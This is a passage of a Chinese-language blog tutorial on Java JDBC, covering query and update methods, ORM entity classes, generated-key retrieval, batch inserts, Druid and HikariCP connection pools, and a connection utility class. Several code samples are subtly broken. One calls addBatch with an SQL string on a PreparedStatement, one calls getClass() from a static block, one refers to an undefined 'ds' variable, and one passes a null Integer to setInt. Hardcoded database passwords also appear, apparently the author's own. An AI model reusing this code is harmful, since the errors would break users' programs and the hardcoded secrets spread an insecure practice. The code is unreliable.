<th>方法</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>executeQuery()</td>
<td>执行SQL查询，并返回查询结果集（ResultSet）</td>
</tr>
<tr>
<td>executeUpdate()</td>
<td>执行SQL更新操作，如INSERT、UPDATE或DELETE语句<br>不返回结果集，返回受影响的行数（即被插入、更新或删除的行数）</td>
</tr>
<tr>
<td>execute()</td>
<td>通用的执行方法，可执行查询语句和更新语句，返回boolean型，代表语句是否超过执行<br>如果执行的是查询语句，则首先需要调用getResultSet()来获取结果集<br>如果执行的是更新语句，则调用getUpdateCount()来获取受影响的行数</td>
</tr>
<tr>
<td>addBatch()</td>
<td>通常和executeBatch()一起用于批处理SQL语句，将SQL语句添加到批处理中</td>
</tr>
<tr>
<td>executeBatch()</td>
<td>通常和addBatch()一起用于批处理SQL语句，执行批处理中的所有SQL语句<br>返回一个整数数组，表示每个更新语句影响的行数。</td>
</tr>
</tbody></table>
<h4 id="普通查询（带参数查询参见上文sql注入的解决）：executeQuery"><a href="#普通查询（带参数查询参见上文sql注入的解决）：executeQuery" class="headerlink" title="普通查询（带参数查询参见上文sql注入的解决）：executeQuery()"></a>普通查询（带参数查询参见上文sql注入的解决）：executeQuery()</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="comment">//1. 注册驱动 - 可省略</span></span><br><span class="line">    Class.forName(<span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>);</span><br><span class="line">    <span class="comment">//2. 获取连接</span></span><br><span class="line">    <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> DriverManager.getConnection(<span class="string">&quot;jdbc:mysql://localhost/atguigudb&quot;</span></span><br><span class="line">            ,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;SillyBoy&quot;</span>);</span><br><span class="line">    <span class="comment">//3. 预编译SQL语句得到preparedStatement对象</span></span><br><span class="line">    <span class="type">PreparedStatement</span> <span class="variable">preparedStatement</span> <span class="operator">=</span> connection.prepareStatement(<span class="string">&quot;Select employee_id, last_name, salary from employees&quot;</span>);</span><br><span class="line">    <span class="comment">//4. 执行sql语句，获取结果</span></span><br><span class="line">    <span class="type">ResultSet</span> <span class="variable">resultSet</span> <span class="operator">=</span> preparedStatement.executeQuery();</span><br><span class="line">    <span class="comment">//5. 输出结果</span></span><br><span class="line">    <span class="comment">// 确定只有一条结果时可以直接使用if(resultSet.next())&#123;..&#125;</span></span><br><span class="line">    <span class="keyword">while</span>(resultSet.next())&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">id</span> <span class="operator">=</span> resultSet.getInt(<span class="string">&quot;employee_id&quot;</span>);</span><br><span class="line">        <span class="comment">// 也可以使用下标，但不建议</span></span><br><span class="line">        <span class="comment">// int id = resultSet.getInt(1);</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> resultSet.getString(<span class="string">&quot;last_name&quot;</span>);</span><br><span class="line">        <span class="type">double</span> <span class="variable">salary</span> <span class="operator">=</span> resultSet.getDouble(<span class="string">&quot;salary&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;&quot;</span>+id+<span class="string">&quot;\t&quot;</span>+name+<span class="string">&#x27;\t&#x27;</span>+salary);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//6. 关闭资源 先开后关</span></span><br><span class="line">    resultSet.close();</span><br><span class="line">    preparedStatement.close();</span><br><span class="line">    connection.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="插入数据：executeUpdate"><a href="#插入数据：executeUpdate" class="headerlink" title="插入数据：executeUpdate()"></a>插入数据：executeUpdate()</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> DriverManager.getConnection(<span class="string">&quot;jdbc:mysql:///atguigudb&quot;</span>, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;fsy030603.&quot;</span>);</span><br><span class="line">    <span class="type">PreparedStatement</span> <span class="variable">preparedStatement</span> <span class="operator">=</span> connection.prepareStatement(<span class="string">&quot;insert into testTable(employee_id, last_name, salary) values(?,?,?)&quot;</span>);</span><br><span class="line">    preparedStatement.setInt(<span class="number">1</span>,<span class="number">200</span>);</span><br><span class="line">    <span class="comment">//对应第二个？</span></span><br><span class="line">    preparedStatement.setString(<span class="number">2</span>,<span class="string">&quot;Tones Jewelery&quot;</span>);</span><br><span class="line">    preparedStatement.setDouble(<span class="number">3</span>,<span class="number">8700.00</span>);</span><br><span class="line">    <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> preparedStatement.executeUpdate();</span><br><span class="line">    <span class="comment">//根据影响的行数判断是否成功</span></span><br><span class="line">    <span class="keyword">if</span> (result&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;插入超过&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;插入失败&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    preparedStatement.close();</span><br><span class="line">    connection.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="常见问题和注意事项"><a href="#常见问题和注意事项" class="headerlink" title="常见问题和注意事项"></a>常见问题和注意事项</h3><p><strong>注意</strong></p>
<ol>
<li>编写sql语句时应当尽量在MySQL的图形化工具中测试一次，以避免输入错误。</li>
<li>在使用JDBC的相关资源时，比如Connection、PreparedStatement、ResultSet，使用完毕后，要及时关闭这些资源以释放数据库服务器资源和避免内存泄漏是很重要的。</li>
</ol>
<p><strong>常见问题</strong></p>
<ol>
<li>java.sql.SQLSyntaxErrorException：SQL语句错误异常，一般有几种可能：sql语法错误；连接数据库名称错误</li>
<li>java.sql.SQLException：No value specified for parameter 1：使用预编译SQL语句时，没有为每一个占位符<code>?</code>赋值</li>
<li>java.sql.SQLException：Access denied …(…YES)：用户名&#x2F;密码输入错误</li>
<li>com.mysql.cj.jdbc.exceptions.CommunicationsException: Communications link failure：数据库连接ip或端口错误</li>
</ol>
<h2 id="进阶-JDBC扩展"><a href="#进阶-JDBC扩展" class="headerlink" title="进阶-JDBC扩展"></a>进阶-JDBC扩展</h2><h3 id="实体类和ORM"><a href="#实体类和ORM" class="headerlink" title="实体类和ORM"></a>实体类和ORM</h3><p>在使用JDBC操作数据库时，明明在数据库中是一行完整的数据，到了Java中变成了零散的数据，一个一个的变量，不利于维护和管理。而Java是面向对象的，一个表对应的是一个类，一行数据就对应的是Java中的一个对象，一个列对应的是对象的属性，所以应当数据存储在一个载体里，这个载体就是实体类！<br><code>ORM（Object Relational Mapping）</code>思想，对象到关系数据库的映射，作用是在编程中，把面向对象的概念跟数据库中表的概念对应起来，以面向对象的角度操作数据库中的数据，即一张表对应一个类，一行数据对应一个对象，一个列对应一个属性！目前学习的JDBC中这种过程称为手动ORM。后续可以学习ORM框架，比如MyBatis、JPA等。</p>
<p><strong>实体类构建</strong></p>
<p>一般将实体类放在子包pojo下以提高代码可读性<br><strong>实体类要求：</strong>(javaBean)</p>
<ul>
<li>类名对应表名（表名对应的全名）</li>
<li>属性名对应列名，符和驼峰法</li>
<li>提供无参构造器、全参构造器、Get&#x2F;Set方法、toString方法重写</li>
</ul>
<p>示例</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Employee</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Integer employeeId;</span><br><span class="line">    <span class="keyword">private</span> String lastName;</span><br><span class="line">    <span class="keyword">private</span> Double salary;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Employee</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Employee</span><span class="params">(Integer employeeId, String lastName, Double salary)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.employeeId = employeeId;</span><br><span class="line">        <span class="built_in">this</span>.lastName = lastName;</span><br><span class="line">        <span class="built_in">this</span>.salary = salary;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 省略Get/Set方法、toString方法重写</span></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p><strong>ORM</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="type">ResultSet</span> <span class="variable">resultSet</span> <span class="operator">=</span> preparedStatement.executeQuery();</span><br><span class="line"><span class="type">Employee</span> <span class="variable">employee</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">List&lt;Employee&gt; employeeList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(resultSet.next())&#123;</span><br><span class="line">    employee = <span class="keyword">new</span> <span class="title class_">Employee</span>(resultSet.getInt(<span class="string">&quot;employee_id&quot;</span>), resultSet.getString(<span class="string">&quot;last_name&quot;</span>)</span><br><span class="line">            ,resultSet.getDouble(<span class="string">&quot;salary&quot;</span>));</span><br><span class="line">    employeeList.add(employee);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(Employee emp:employeeList)&#123;</span><br><span class="line">    emp.toString();</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<h3 id="主键回显"><a href="#主键回显" class="headerlink" title="主键回显"></a>主键回显</h3><p>在数据中，执行新增操作时，主键列为自动增长，可以在表中直观的看到，但是在Java程序中，执行完新增语句后，只能得到受影响行数，无法得知当前新增数据的主键值。在Java程序中获取数据库中插入新数据后的主键值，并赋值给Java对象，此操作为主键回显。</p>
<p>代码实现：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">    <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;insert into testTable(employee_id, last_name, salary) values(?,?,?)&quot;</span>;</span><br><span class="line">    <span class="comment">// 使用Statement.RETURN_GENERATED_KEYS要求返回生成的主键值</span></span><br><span class="line">    <span class="type">PreparedStatement</span> <span class="variable">preparedStatement</span> <span class="operator">=</span> connection.prepareStatement(sql, Statement.RETURN_GENERATED_KEYS);</span><br><span class="line">    <span class="type">Employee</span> <span class="variable">employee</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Employee</span>(<span class="literal">null</span>,<span class="string">&quot;Tones lorry&quot;</span>,<span class="number">8800.00</span>);</span><br><span class="line">    preparedStatement.setInt(<span class="number">1</span>, employee.getEmployeeId());</span><br><span class="line">    preparedStatement.setString(<span class="number">2</span>, employee.getLastName());</span><br><span class="line">    preparedStatement.setDouble(<span class="number">3</span>, employee.getSalary());</span><br><span class="line">    <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> preparedStatement.executeUpdate();</span><br><span class="line">    <span class="type">ResultSet</span> <span class="variable">resultSet</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (result&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;插入成功&quot;</span>);</span><br><span class="line">        <span class="comment">// 获取当前新增数据的主键列，回显到Java中的employee对象的employeeId属性上</span></span><br><span class="line">        <span class="comment">// 返回的主键值是一个单行单列的存储在ResultSet中的结果</span></span><br><span class="line">        resultSet = preparedStatement.getGeneratedKeys();</span><br><span class="line">        <span class="keyword">if</span>(resultSet.next())&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">empId</span> <span class="operator">=</span> resultSet.getInt(<span class="number">1</span>);</span><br><span class="line">            employee.setEmployeeId(empId);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(employee);</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    ...&#125;</span><br><span class="line">    <span class="keyword">if</span>(resultSet != <span class="literal">null</span>)&#123;</span><br><span class="line">        resultSet.close();</span><br><span class="line">    &#125;</span><br><span class="line">...<span class="comment">//其他关闭操作</span></span><br></pre></td></tr></table></figure>

<h3 id="批量处理"><a href="#批量处理" class="headerlink" title="批量处理"></a>批量处理</h3><p>通过批量操作，同时执行多条sql语句（主要是数据更新语句），可以提升多次操作效率<br>可以通过循环，也可以使用批量处理，减少java和MySQL交互，提高效率<br>注意：</p>
<ol>
<li>必须在连接数据库的URL后面追加<code>?rewriteBatchedStatements=true</code>，允许批量操作</li>
<li>新增SQL必须用values。且语句最后不要追加;结束</li>
<li>调用addBatch()方法，将SQL语句进行批量添加操作</li>
<li>统一执行批量操作，调用executeBatch()</li>
<li>批处理的主要用途和性能优势通常体现在执行多个更新（INSERT、UPDATE、DELETE）语句时。这是因为批处理可以减少网络往返次数和数据库调用的开销，从而提高效率。<strong>在批处理中不要插入查询语句</strong></li>
</ol>
<p>批处理示例1：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">preparedStatement.addBatch(<span class="string">&quot;INSERT INTO users (name, email) VALUES (?, ?)&quot;</span>);  </span><br><span class="line">preparedStatement.addBatch(<span class="string">&quot;INSERT INTO users (name, email) VALUES (?, ?)&quot;</span>);  </span><br><span class="line"><span class="comment">// 设置参数...  </span></span><br><span class="line"><span class="type">int</span>[] counts = preparedStatement.executeBatch();  </span><br><span class="line"><span class="comment">// 处理counts数组中的值...</span></span><br></pre></td></tr></table></figure>

<p>批处理示例2：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test1</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql:///atguigudb?rewriteBatchedStatements=true&quot;</span>;</span><br><span class="line">    <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> DriverManager.getConnection(url, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;fsy030603.&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;insert into testTable(employee_id, last_name, salary) values(?,?,?)&quot;</span>;</span><br><span class="line">    <span class="type">PreparedStatement</span> <span class="variable">preparedStatement</span> <span class="operator">=</span> connection.prepareStatement(sql);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;i &lt; <span class="number">10</span>;i++) &#123;</span><br><span class="line">        preparedStatement.setInt(<span class="number">1</span>, <span class="number">202</span> + i);</span><br><span class="line">        preparedStatement.setString(<span class="number">2</span>, <span class="string">&quot;Tones Jewelery&quot;</span> + i);</span><br><span class="line">        preparedStatement.setDouble(<span class="number">3</span>, <span class="number">8700.00</span>+i*<span class="number">100</span>);</span><br><span class="line">        preparedStatement.addBatch();</span><br><span class="line">    &#125;</span><br><span class="line">    preparedStatement.executeBatch();</span><br><span class="line">    preparedStatement.close();</span><br><span class="line">    connection.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h2 id="进阶-连接池"><a href="#进阶-连接池" class="headerlink" title="进阶-连接池"></a>进阶-连接池</h2><p>此前我们每次操作数据库都要获取新连接，使用完毕后就close释放，频繁的创建和销毁造成资源浪费，同时连接的数量无法把控，对服务器来说压力巨大。为解决此问题，我们引入<code>连接池</code></p>
<p><code>连接池的概念</code></p>
<ul>
<li>连接池就是数据库连接对象的缓冲区，通过配置，由连接池负责创建连接、管理连接、释放连接等操作。</li>
<li>预先创建数据库连接放入连接池，用户在请求时，通过池直接获取连接，使用完毕后，将连接放回池中，避免了频繁的创建和销毁，同时解决了创建的效率。</li>
<li>当池中无连接可用，且未达到上限时，连接池会新建连接。</li>
<li>池中连接达到上限，用户请求会等待，可以设置超时时间</li>
</ul>
<h3 id="常见连接池"><a href="#常见连接池" class="headerlink" title="常见连接池"></a>常见连接池</h3><p>JDBC 的数据库连接池使用 javax.sql.DataSource接口进行规范，所有的第三方连接池都实现此接口，自行添加具体实现！也就是说，所有连接池获取连接的和回收连接方法都一样，不同的只有性能和扩展功能!</p>
<ul>
<li>（了解）<code>DBCP</code>是Apache提供的数据库连接池，速度相对C3P0较快，但自身存在一些BUG。</li>
<li>（了解）<code>C3P0</code>是一个开源组织提供的一个数据库连接池，速度相对较慢，稳定性还可以。</li>
<li>（了解）<code>Proxool</code>是sourceforge下的一个开源项目数据库连接池，有监控连接池状态的功能， 稳定性较c3p0差一点</li>
<li>（重点）<code>Druid</code>是阿里提供的数据库连接池，是集DBCP 、C3P0 、Proxool 优点于一身的数据库连接池，性能、扩展性、易用性都更好，功能丰富。<strong>拓展性强</strong></li>
<li>（重点）<code>Hikari</code>（ひかり[shi ga li]） 取自日语，是光的意思，是SpringBoot2.x之后内置的一款连接池，基于BoneCP （已经放弃维护，推荐该连接池）做了不少的改进和优化，口号是快速、简单、可靠。<strong>高速</strong></li>
</ul>
<p>性能对比<br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240810170632.png" alt="常见连接池"></p>
<p>硬编码和软编码</p>
<ul>
<li>硬编码：直接在代码中编写数据库连接池的配置信息。简单直接，但缺乏灵活性，一旦需要更改数据库连接信息，就需要修改代码并重新编译。</li>
<li>软编码：将数据库连接池的配置信息存储在外部配置文件中（如properties文件、XML文件或YAML文件等），程序运行时读取这些配置文件来获取连接池配置信息。高灵活性，便于在不修改代码的情况下更改数据库连接信息。</li>
</ul>
<p>实现Druid前必须先导入druid-xx.jar包；实现Hikari必须先导入 HikariCP-x.x.x.jar、slf4j-api-x.x.x.jar</p>
<h3 id="Druid的硬编码实现"><a href="#Druid的硬编码实现" class="headerlink" title="Druid的硬编码实现"></a>Druid的硬编码实现</h3><p><strong>步骤</strong></p>
<ol>
<li>创建连接池对象：使用连接池提供的类（如Druid连接池的DruidDataSource）创建连接池对象。</li>
<li>设置连接池配置信息【必须|非必须】：包括数据库的<strong>URL、用户名、密码、驱动类名</strong>等必须参数，以及初始化连接数、最大活跃连接数等可选参数。</li>
<li>获取连接：通过连接池对象获取数据库连接。</li>
<li>使用连接：执行数据库操作。</li>
<li>回收连接：使用完毕后，关闭连接以释放资源，实际上是将连接放回连接池中。</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testHardDruid</span><span class="params">()</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    <span class="comment">//1.</span></span><br><span class="line">    <span class="type">DruidDataSource</span> <span class="variable">druidDataSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DruidDataSource</span>();</span><br><span class="line">    <span class="comment">//2.</span></span><br><span class="line">    <span class="comment">//2.1 必须的配置：驱动类名、URL、用户名、密码</span></span><br><span class="line">    druidDataSource.setDriverClassName(<span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>);</span><br><span class="line">    druidDataSource.setUrl(<span class="string">&quot;jdbc:mysql:///yourDataBaseName&quot;</span>);</span><br><span class="line">    druidDataSource.setUsername(<span class="string">&quot;root&quot;</span>);</span><br><span class="line">    druidDataSource.setPassword(<span class="string">&quot;fsy030603.&quot;</span>);</span><br><span class="line">    <span class="comment">//2.2 可选配置项：连接池初始连接量、最大连接量（不设就为8）等</span></span><br><span class="line">    druidDataSource.setInitialSize(<span class="number">10</span>);</span><br><span class="line">    druidDataSource.setMaxActive(<span class="number">20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//3. 通过连接池获取连接对象 getConnection();各类连接池均可使用，非druid专用</span></span><br><span class="line">    <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> druidDataSource.getConnection();</span><br><span class="line"></span><br><span class="line">    ... <span class="comment">//基于connect的CRUD</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//4. 回收连接</span></span><br><span class="line">    connection.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果设置最小连接数就要设置最大连接数</p>
<h3 id="Druid的软编码实现"><a href="#Druid的软编码实现" class="headerlink" title="Druid的软编码实现"></a>Druid的软编码实现</h3><p><strong>步骤</strong></p>
<ol>
<li>创建外部配置文件：在项目中创建配置文件，并编写数据库连接池的配置信息。</li>
<li>读取配置文件：程序启动时读取配置文件，获取数据库连接池的配置信息。</li>
<li>创建连接池对象：使用读取到的配置信息创建连接池对象。</li>
<li>获取连接：通过连接池对象获取数据库连接。</li>
<li>使用连接：执行数据库操作。</li>
<li>回收连接：使用完毕后，关闭连接以释放资源。</li>
</ol>
<p>在项目目录下创建resources文件夹，标识该文件夹为资源目录，新建资源包，命名为db.properties，作为配置文件，将连接信息定义在该文件中。</p>
<p><strong>druid连接池需要的配置参数，key固定命名</strong></p>
<p>示例</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">driverClassName=com.mysql.cj.jdbc.Driver</span><br><span class="line">url=jdbc:mysql:///atguigu</span><br><span class="line">username=root</span><br><span class="line">password=atguigu</span><br><span class="line"></span><br><span class="line">initialSize=10</span><br><span class="line">maxActive=20</span><br></pre></td></tr></table></figure>
<p>实现</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testSoftDruid</span><span class="params">()</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">//0.1 创建properties集合用于存储外部配置文件的key和value值</span></span><br><span class="line">        <span class="type">Properties</span> <span class="variable">properties</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line">        <span class="comment">//0.2 读取外部配置文件，获取输入流，加载到properties集合</span></span><br><span class="line">        <span class="comment">//    DruidTest.class.getClassLoader().getResourceAsStream()加载类时加载外部资源</span></span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> DruidTest.class.getClassLoader().</span><br><span class="line">                getResourceAsStream(<span class="string">&quot;db.properties&quot;</span>);</span><br><span class="line">        properties.load(inputStream);</span><br><span class="line">        <span class="comment">//1. 通过DruidDataSourceFactory.createDataSource创建连接池</span></span><br><span class="line">        <span class="comment">// DataSource 是 DruidDataSourceFactory 的父接口</span></span><br><span class="line">        <span class="type">DataSource</span> <span class="variable">dataSource</span> <span class="operator">=</span> DruidDataSourceFactory.createDataSource(properties);</span><br><span class="line"><span class="comment">//        //2. 此步无</span></span><br><span class="line">        <span class="comment">//3. 通过连接池获取连接对象 getConnection();各类连接池均可使用，非druid专用</span></span><br><span class="line">        <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> dataSource.getConnection();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//... //基于connect的CRUD</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//4. 回收连接</span></span><br><span class="line">        connection.close();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>


<h3 id="HikarCP的硬编码实现"><a href="#HikarCP的硬编码实现" class="headerlink" title="HikarCP的硬编码实现"></a>HikarCP的硬编码实现</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testHardHikari</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    <span class="comment">//1.</span></span><br><span class="line">    <span class="type">HikariDataSource</span> <span class="variable">hikariDataSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HikariDataSource</span>();</span><br><span class="line">    <span class="comment">//2.</span></span><br><span class="line">    hikariDataSource.setDriverClassName(<span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>);</span><br><span class="line">    <span class="comment">//以下方法为主要不同</span></span><br><span class="line">    hikariDataSource.setJdbcUrl(<span class="string">&quot;jdbc:mysql:///atguigudb&quot;</span>);</span><br><span class="line">    hikariDataSource.setUsername(<span class="string">&quot;root&quot;</span>);</span><br><span class="line">    hikariDataSource.setPassword(<span class="string">&quot;atguigu&quot;</span>);</span><br><span class="line">    <span class="comment">//3.</span></span><br><span class="line">    <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> hikariDataSource.getConnection();</span><br><span class="line">    <span class="comment">//....//CRUD</span></span><br><span class="line">    <span class="comment">//4.</span></span><br><span class="line">    connection.close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="HikarCP的软编码实现"><a href="#HikarCP的软编码实现" class="headerlink" title="HikarCP的软编码实现"></a>HikarCP的软编码实现</h3><p>注意：properties中<code>url=jdbc:mysql:///atguigu</code>应改为<code>jdbcUrl=jdbc:mysql:///atguigu</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 3,4点为与druid的主要区别点（与druid中1对应</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testSoftHikari</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    <span class="comment">//1 创建properties集合用于存储外部配置文件的key和value值</span></span><br><span class="line">    <span class="type">Properties</span> <span class="variable">properties</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line">    <span class="comment">//2 读取外部配置文件，获取输入流，加载到properties集合</span></span><br><span class="line">    <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> DruidTest.class.getClassLoader().</span><br><span class="line">            getResourceAsStream(<span class="string">&quot;hikari.properties&quot;</span>);</span><br><span class="line">    properties.load(inputStream);</span><br><span class="line">    <span class="comment">//3. 创建Hikari连接池配置对象，传入properties集合</span></span><br><span class="line">    <span class="type">HikariConfig</span> <span class="variable">hikariConfig</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HikariConfig</span>(properties);</span><br><span class="line">    <span class="comment">//4. 基于Hikari配置对象创建连接池</span></span><br><span class="line">    <span class="type">DataSource</span> <span class="variable">dataSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HikariDataSource</span>(hikariConfig);</span><br><span class="line">    <span class="comment">//5. 通过连接池获取连接对象 getConnection();各类连接池均可使用，非druid专用</span></span><br><span class="line">    <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> dataSource.getConnection();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//... //基于connect的CRUD</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//6. 回收连接</span></span><br><span class="line">    connection.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h2 id="高级-优化及工具类封装"><a href="#高级-优化及工具类封装" class="headerlink" title="高级-优化及工具类封装"></a>高级-优化及工具类封装</h2><p>可见上述连接池实现代码都是模板化的，而为了避免每次编写代码时都编写一次连接池的代码，基于上述方法可以实现JDBC连接池工具类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.druid.pool.DruidDataSourceFactory;</span><br><span class="line"><span class="keyword">import</span> javax.sql.DataSource;</span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* JDBC工具类（V1.0）：</span></span><br><span class="line"><span class="comment">* 1、维护一个连接池对象。</span></span><br><span class="line"><span class="comment">* 2、对外提供在连接池中获取连接的方法</span></span><br><span class="line"><span class="comment">* 3、对外提供回收连接的方法</span></span><br><span class="line"><span class="comment">* 注意：工具类仅对外提供共性的功能代码，所以方法均为静态方法！</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JDBCTools</span> &#123;</span><br><span class="line">  <span class="comment">//创建连接池引用，因为要提供给当前项目全局使用，所以创建为静态的。</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> DataSource dataSource;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//在项目启动时，即创建连接池对象，赋值给dataSource，使得连接池对象实例化只一次</span></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Properties</span> <span class="variable">properties</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span></span><br><span class="line">                    JDBCTools.getClass().getClassLoader().getSystemResourceAsStream(<span class="string">&quot;db.properties&quot;</span>);</span><br><span class="line">            properties.load(inputStream);</span><br><span class="line">            dataSource =</span><br><span class="line">                    DruidDataSourceFactory.createDataSource(properties);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//对外提供获取连接的静态方法！</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Connection <span class="title function_">getConnection</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">        <span class="keyword">return</span> ds.getConnection();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//对外提供回收连接的静态方法</span></span><br><span class="line">    <span class="keyword">public</span> 